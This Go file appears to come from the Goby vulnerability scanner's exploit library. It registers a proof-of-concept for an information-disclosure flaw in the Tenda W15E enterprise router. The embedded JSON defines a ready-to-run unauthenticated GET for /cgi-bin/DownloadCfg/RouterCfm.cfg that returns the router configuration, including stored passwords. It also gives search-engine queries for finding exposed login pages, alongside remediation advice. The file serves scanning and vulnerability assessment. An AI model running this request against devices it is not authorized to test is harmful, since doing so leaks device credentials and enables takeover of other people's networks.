package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Tenda W15E Enterprise Router RouterCfm.cfg Information Disclosure Vulnerability",
    "Description": "<p>Tenda W15E enterprise-class router is a high-speed and convenient enterprise-class router.</p><p>Tenda W15E enterprise routers have security vulnerabilities. Attackers can download the RouterCfm.cfg file to obtain sensitive information such as account passwords.</p>",
    "Product": "Tenda W15E",
    "Homepage": "https://www.tenda.com.cn/product/W15E.html",
    "DisclosureDate": "2022-11-14",
    "Author": "corp0ra1",
    "FofaQuery": "title==\"Tenda | Login\"",
    "GobyQuery": "title==\"Tenda | Login\"",
    "Level": "2",
    "Impact": "<p>Tenda W15E enterprise routers have security vulnerabilities. Attackers can download the RouterCfm.cfg file to obtain sensitive information such as account passwords.</p>",
    "Recommendation": "<p>1. Prohibit public network access unless necessary. 2. At present, the manufacturer has released the vulnerability patch, pay attention to the official website in time: <a href=\"https://www.tenda.com.cn/product/W15E.html\">https://www.tenda.com.cn/product/W15E.html</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/w-cZU06p5VJb82bs2uoIeg"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/DownloadCfg/RouterCfm.cfg",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sys.userpass=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "config/conf",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/DownloadCfg/RouterCfm.cfg",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "sys.userpass=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "config/conf",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Tenda W15E企业级路由器 RouterCfm.cfg 信息泄露漏洞",
            "Product": "Tenda W15E",
            "Description": "<p>Tenda W15E企业级路由器是一款高速便捷的企业级路由器。<br></p><p>Tenda W15E企业级路由器存在安全漏洞，攻击者可下载RouterCfm.cfg文件，获取账号密码等敏感信息。<br></p>",
            "Recommendation": "<p>1、如非必要禁止公网访问。2、目前厂商已发布漏洞补丁，及时关注官网：<a href=\"https://www.tenda.com.cn/product/W15E.html\">https://www.tenda.com.cn/product/W15E.html</a><br></p>",
            "Impact": "<p>Tenda W15E企业级路由器存在安全漏洞，攻击者可下载RouterCfm.cfg文件，获取账号密码等敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Tenda W15E Enterprise Router RouterCfm.cfg Information Disclosure Vulnerability",
            "Product": "Tenda W15E",
            "Description": "<p>Tenda W15E enterprise-class router is a high-speed and convenient enterprise-class router.<br></p><p>Tenda W15E enterprise routers have security vulnerabilities. Attackers can download the RouterCfm.cfg file to obtain sensitive information such as account passwords.<br></p>",
            "Recommendation": "<p>1. Prohibit public network access unless necessary. 2. At present, the manufacturer has released the vulnerability patch, pay attention to the official website in time: <a href=\"https://www.tenda.com.cn/product/W15E.html\">https://www.tenda.com.cn/product/W15E.html</a><br></p>",
            "Impact": "<p>Tenda W15E enterprise routers have security vulnerabilities. Attackers can download the RouterCfm.cfg file to obtain sensitive information such as account passwords.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}